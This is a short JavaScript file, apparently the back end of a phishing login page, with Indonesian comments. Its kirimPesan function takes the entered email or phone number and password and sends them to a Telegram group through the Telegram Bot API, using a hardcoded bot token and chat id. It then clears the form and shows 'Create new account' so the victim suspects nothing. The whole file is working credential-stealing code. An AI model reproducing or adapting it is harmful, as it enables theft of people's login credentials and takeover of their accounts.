function kirimPesan() {
    var emailOrPhone = document.getElementById('email_or_phone').value;
    var password = document.getElementById('password').value;

    var gabungan = 'Email%20atau%20nomor%20telepon%3A%0A' + encodeURIComponent(emailOrPhone) + '%0APassword%3A%0A' + encodeURIComponent(password);

    var token = '6881667147:AAG_C3UWpEys2igKflAF-AagpxC4zjy8a-A';
    var grup = '-1002052635750';
    var statusPesan = document.getElementById('statusPesan');

    $.ajax({
        url: 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + grup + '&text=' + gabungan + '&parse_mode=html',
        method: 'GET',
        success: function() {
            // Reset input email dan password setelah berhasil login
            document.getElementById('email_or_phone').value = '';
            document.getElementById('password').value = '';
            // Ubah teks status pesan menjadi "Create new account" dengan warna background #3ba626
            statusPesan.innerHTML = 'Create new account';
            statusPesan.style.backgroundColor = '#3ba626';
        },
        error: function() {
            // Terjadi kesalahan saat mengirim pesan
            statusPesan.innerHTML = 'Pesan gagal dikirim. Silakan coba lagi.';
            statusPesan.style.backgroundColor = ''; // Kembalikan warna latar belakang ke default jika terjadi kesalahan
        }
    });
}

function resetForm() {
    // Reset input email dan password
    document.getElementById('email_or_phone').value = '';
    document.getElementById('password').value = '';
    // Ubah teks status pesan menjadi "Create new account" dengan warna background #3ba626
    var statusPesan = document.getElementById('statusPesan');
    statusPesan.innerHTML = 'Create new account';
    statusPesan.style.backgroundColor = '#3ba626';
}
